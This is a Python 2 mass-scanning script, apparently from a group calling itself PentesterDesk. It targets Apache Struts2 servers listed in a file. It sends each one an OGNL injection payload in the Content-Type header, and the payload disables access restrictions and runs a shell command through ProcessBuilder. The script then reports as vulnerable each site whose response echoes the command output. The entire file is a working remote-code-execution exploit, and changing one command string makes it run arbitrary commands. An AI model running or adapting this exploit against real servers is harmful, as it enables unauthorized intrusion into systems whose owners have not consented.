#!/usr/bin/python
# -*- coding: utf-8 -*-
#coder: PentesterDesk
import sys, os
import requests
banner = '''

			+======================================================+
			|    	Structs    |  Mass scanner |  PentesterDesk    |
			|         Coded by : PentesterDesk Team                |
			|         Contact  : pentesterdesk@gmail.com           |
			+======================================================+
			'''

def main():
	os.system('cls' and 'color -a' if os.name == "nt" else 'clear') 
	print(banner)
	
	try:
		print " Usage : python  MassApache.py filename.txt"
		fil = sys.argv[1]
		exp = "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='echo pentesterdesk').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
		header={'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36','Content-Type':exp}
		print" [+] Loading List "
		ob = open(fil,'r')
		lists = ob.readlines()
		list1 = []
		i = 0
		for i in range(len(lists)):
			list1.append(lists[i].strip('\n'))
		for site in list1:
			req= requests.get(url=site,headers=header)
			if 'pentesterdesk' in req.content:
				print " [✔] %s [Vulnerable]"%(site)
			else:
				print " [✘] %s [Not-Vulnerable]"%(site)
			
	except:
			pass
if __name__ == '__main__':
	main()
